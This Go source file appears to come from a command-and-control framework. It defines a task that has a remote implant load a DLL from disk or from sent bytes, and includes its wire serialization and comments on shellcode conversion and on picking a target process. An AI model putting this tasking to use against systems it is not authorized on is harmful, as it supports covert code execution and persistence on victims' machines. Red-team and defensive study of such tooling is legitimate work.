package task

import (
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// DLL is a Tasklet that is similar to the 'cmd.DLL' struct. This is
// used to Task a Client with loading a DLL.
//
// The Path parameter is the path (on the client) where the DLL is located.
// This may be omitted and Data can be filled instead with the raw binary data
// to send and load a remote DLL instead. (THIS WILL MAKE A WRITE TO DISK!)
//
// To prevent writes to disk, use the 'cmd.DLLToASM' function on the server
// (or any non 'implant' tagged build) to build a shellcode DLL+loader using
// SRDi and launch as Assembly instead.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The Filter attribute will attempt to set the target that runs the Process.
// If none are specified, the Process will be ran under the client process.
//
// C2 Details:
//  ID: TvDLL
//
//  Input:
//      DLL struct {
//          string          // Path
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Raw DLL Data
//      }
//  Output:
//      uint64              // Handle
//      uint32              // PID
//      int32               // Exit Code
//
// C2 Client Command:
//    dll <path>
//    dll_local <path>
type DLL struct {
	Filter *filter.Filter

	Path    string
	Data    []byte
	Wait    bool
	Timeout time.Duration
}

// Packet will take the configured DLL options and will return a Packet and any
// errors that may occur during building.
//
// This allows the DLL struct to fulfil the 'Tasklet' interface.
//
// C2 Details:
//  ID: TvDLL
//
//  Input:
//      DLL struct {
//          string          // Path
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Raw DLL Data
//      }
//  Output:
//      uint64              // Handle
//      uint32              // PID
//      int32               // Exit Code
//
// C2 Client Command:
//    dll <path>
//    dll_local <path>
func (d DLL) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvDLL}
	d.MarshalStream(n)
	return n, nil
}

// MarshalStream writes the data for this DLL task to the supplied Writer.
func (d DLL) MarshalStream(w data.Writer) error {
	if err := w.WriteString(d.Path); err != nil {
		return err
	}
	if err := w.WriteBool(d.Wait); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(d.Timeout)); err != nil {
		return err
	}
	if err := d.Filter.MarshalStream(w); err != nil {
		return err
	}
	if err := w.WriteBytes(d.Data); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this DLL task from the supplied Reader.
func (d *DLL) UnmarshalStream(r data.Reader) error {
	if err := r.ReadString(&d.Path); err != nil {
		return err
	}
	if err := r.ReadBool(&d.Wait); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&d.Timeout)); err != nil {
		return err
	}
	if err := filter.UnmarshalStream(r, &d.Filter); err != nil {
		return err
	}
	if err := r.ReadBytes(&d.Data); err != nil {
		return err
	}
	return nil
}
